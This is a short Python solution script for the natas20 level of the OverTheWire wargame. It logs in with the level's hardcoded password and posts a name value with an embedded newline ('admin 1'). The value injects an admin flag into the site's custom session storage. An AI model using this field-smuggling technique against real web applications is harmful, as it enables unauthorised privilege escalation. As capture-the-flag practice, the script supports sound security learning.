# exploit.

import requests
import re

url = 'http://natas20.natas.labs.overthewire.org/?debug=true'
username = 'natas20'
password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'

session = requests.Session()

# Here we create the file in which 'mywrite' function will write to.
response = session.get(url, auth = (username, password))
print("***")
print("[*] Status: " + str(response.status_code))
print("[*] Response: \n" + str(response.text))
print("***\n\n")

# Here we trick 'myread' function into reading 'admin 1' after the 'msarafos', 
# because the explode() function it is using distinguishes the array indexes when reading the '\n' character.
# We need $_SESSION["admin"] == 1, so this is what we are doing.
response = session.post(url, auth = (username, password), data = {"name":"dusu\nadmin 1"})
print("***")
print("[*] Status: " + str(response.status_code))
print("[*] Response: \n" + str(response.text))
print("***\n\n")

# Here 'myread' function reads 'admin 1' and gives us access to the next level.
response = session.get(url, auth = (username, password))
print("***")
print("[*] Status: " + str(response.status_code))
print("[*] Response: \n" + str(response.text))
print("***\n\n")


